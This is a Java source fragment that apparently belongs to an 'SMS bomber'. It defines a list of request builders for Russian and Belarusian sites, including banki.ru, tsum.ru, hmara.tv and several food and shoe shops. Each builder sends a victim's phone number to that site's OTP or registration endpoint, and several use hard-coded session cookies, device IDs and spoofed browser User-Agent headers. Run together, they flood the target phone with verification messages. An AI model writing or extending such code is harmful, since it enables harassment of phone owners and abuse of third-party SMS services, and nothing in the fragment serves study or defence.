                    return json.toString();
                }
            },

            new ParamsService("https://my.hmara.tv/api/sign", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addEncodedQueryParameter("contact", getFormattedPhone());
                    builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                    builder.addEncodedQueryParameter("language", "ru");
                    builder.addEncodedQueryParameter("profileId", "1");
                    builder.addEncodedQueryParameter("deviceType", "2");
                    builder.addEncodedQueryParameter("ver", "2.2.9");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://www.banki.ru/ng/api/v1.0/public/auth/send-otp/") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", "+" + getFormattedPhone());
                    builder.add("isRulesAccepted", "true");
                    builder.add("isAdAccepted", "false");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ym_uid=1648578272916533346; _ym_d=1648578272; __hash_=a0d590e952832dddd9d48a77d78ea03b; __lhash_=499667e103738417a3e13140337645ea; HO_SOURCE=seo_google; aff_sub3=main; _flpt_main_page_slider_vs_tile=main_page_slider_vs_tile_b; PHPSESSID=5a5dc1f54d0699c13ccd35dfa8a6a3e9; BANKI_RU_USER_IDENTITY_UID=7098436749189750240; _gid=GA1.2.1052824793.1651932173; ga_client_id=627096449.1651932173; tmr_lvid=44ad9df3ed1940bbb4428c5f37f111d8; tmr_lvidTS=1648578270747; _ym_visorc=b; _ym_isad=2; _gcl_au=1.1.144002483.1651932174; counter_session=1; gtm-session-start=1651932172319; _ga_MEEKHDWY53=GS1.1.1651932174.1.0.1651932174.60; _ga=GA1.1.627096449.1651932173; tmr_detect=0%7C1651932175295; user_region_id=4; tmr_reqNum=21; _ga_PG15GEX7CK=GS1.1.1651932174.1.1.1651932204.0");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://api.tsum.ru/authorize/request-sms") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("data",
                                new JSONObject()
                                        .put("type", "requestSMS")
                                        .put("attributes", new JSONObject()
                                                .put("phone", "+" + getFormattedPhone())));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("X-Uid", "364596dd-f214-44a1-97d4-d95318c520a4");
                    builder.header("X-Vbmd", "unXmCApgbbZxz_z4lY6cvWYf3d0bOo7MVG0pxKgVBZbYTINbWRgawwa_sJLz2e70KFmRl29f-p95WUaH5FZs9w==");
                    builder.header("X-XID", "a1c3a60e-2d0a-4b4a-969d-7b1045433ac7");
                    builder.header("Cookie", "xid=a1c3a60e-2d0a-4b4a-969d-7b1045433ac7; _gcl_au=1.1.448087857.1648657957; _calltracking=+7 800 500 80 00,+7 495 933 73 00; utmcsr=(direct); utmcmd=(none); _ga=GA1.2.1794868026.1648657960; tmr_lvid=9121b5516dcc7ec38306d079683c7ab3; tmr_lvidTS=1648657960324; __utmz=75424919.1648657960.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); adtech_uid=e12ae8d1-4a98-46b7-970e-743e9f741728%3Atsum.ru; gtmc_country=%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F; vbmd=unXmCApgbbZxz_z4lY6cvWYf3d0bOo7MVG0pxKgVBZbYTINbWRgawwa_sJLz2e70KFmRl29f-p95WUaH5FZs9w%3D%3D; _ym_d=1648657961; _ym_uid=1648657961753376599; _fbp=fb.1.1648657962784.200886691; uxs_uid=05cb9f40-b047-11ec-a83e-4bfc07941cf7; catalogGender=women; uuid=364596dd-f214-44a1-97d4-d95318c520a4; _dy_c_exps=; _dy_c_att_exps=; _dycnst=dg; gtmc_userAuth=0; __utmzz=utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); utmccn=(direct); _utm_source=(direct); _utm_medium=(none); _utm_campaign=(direct); _dyid=-8385702306948609019; _dycst=dk.w.c.ws.; top100_id=t1.-1.146325552.1651927756067; actual-checkout-type=cart; x-wishlist-sid-local=tM4P_i02xSUqF0Nmb4ary5tnsE6SDcYD; gtmc_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; gtmc_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; user-id_1.0.5_lr_lruid=pQ8AACmGRGJdONYlAZzwQwA%3D; siteVer=1.0.0; _dyjsession=a8bb7m2s388a5hkke5vn6j08q9xell4a; dy_fs_page=www.tsum.ru; _dy_csc_ses=a8bb7m2s388a5hkke5vn6j08q9xell4a; __utmzzses=1; _dy_geo=RU.EU.RU_MOW.RU_MOW_Moscow; _dy_df_geo=Russia..Moscow; _dy_toffset=-3; _dy_soct=1001919.1005341.1652024486*1002271.1002962.1652024486*1059487.1152717.1652024486*1064563.1169707.1652024486.a8bb7m2s388a5hkke5vn6j08q9xell4a*1084509.1240542.1652024486*1090239.1262852.1652024486*1000863.1000949.1652024486*1011710.1020015.1652024486.a8bb7m2s388a5hkke5vn6j08q9xell4a*1012474.1032105.1652024488.a8bb7m2s388a5hkke5vn6j08q9xell4a; _gid=GA1.2.1070190314.1652024489; digsearch=1; _dc_gtm_UA-24116832-9=1; __utmc=75424919; __utma=75424919.1794868026.1648657960.1651927756.1652024489.3; __utmt_UA-24116832-12=1; __utmb=75424919.1.10.1652024489; t2_sid_-1=s1.1534059196.1652024489148.1652024489160.2.1.2.1; _ym_isad=2; gtmc_release=4099e37614b84c76aba0a5856a155b69c2373299; gtmc_cart=%7B%22cnt%22%3A%5B%5D%2C%22id%22%3A%5B%5D%2C%22cd6%22%3A%5B%5D%7D; cto_bundle=Cn_FyV9jNXc3MUlOY1FqMGs0bnclMkZlck5XaVpGVUxoRzZ4bEMyWENxQmtQOTFrTXhmNXJXUjRqYm1USUo0UHl6Zk5TTGdVaEdYSHFjJTJCTDNSMHolMkZNSjhpOUxDNzBnUG5QaFdTY1NCc1ZMN2NNWkRsWE5wck1jRWl3Z1BMNmFwRmk1RzB2SA; tmr_reqNum=12; hits_count=3; _gat_UA-24116832-9=1");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://delivio.by/be/api/register") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://api-new.elementaree.ru/graphql") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "phoneVerification");
                        json.put("query", "mutation phoneVerification($phone: String!) {\n" +
                                "  phoneVerification(phone: $phone) {\n" +
                                "    success\n" +
                                "    interval\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");

                        json.put("variables", new JSONObject()
                                .put("phone", getFormattedPhone()));

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://admin.foodzo.ru/api/v2/users/send-code/phone", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("dest", format(phone, "+7(***)***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://eatstreet.ru:8000/auth/register", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
                        json.put("consent_status", 1);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Api-Agent", "eatstreet");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://www.shashlikof-fast.ru/local/templates/shashlikoff/ajax/formRequest.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", phone);
                    builder.add("subscribe_agreement", "on");
                    builder.add("type", "auth-code-req");
                }
            },

            new FormService("https://beerlogapizza.ru/ajax/global_ajax.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("character", "number");
                    builder.add("phone", phone);
                    builder.add("code", "");
                    builder.add("session_id", "e6ab56c6c97b3a47cdee0f60705a8561");
                }
            },

            new JsonService("https://online-obuv.ru/api/auth/phone-check", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 *** *** ** **"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "session=txTF9Y3V72vUMENOh%2BWZPBScWXZJtn2Jiv3k%3BibFpC5ozKWmSPO%2BKzE0s67LglRo%2FKKc3; _ym_d=1651898175; _ym_uid=1651898175505991986; _ga=GA1.2.961315086.1651898176; _ym_isad=2; _ym_visorc=w; _gid=GA1.2.65197256.1652109072; _gat_gtag_UA_28961058_1=1");

                    return super.buildRequest(builder);
                }
            },
    };
}
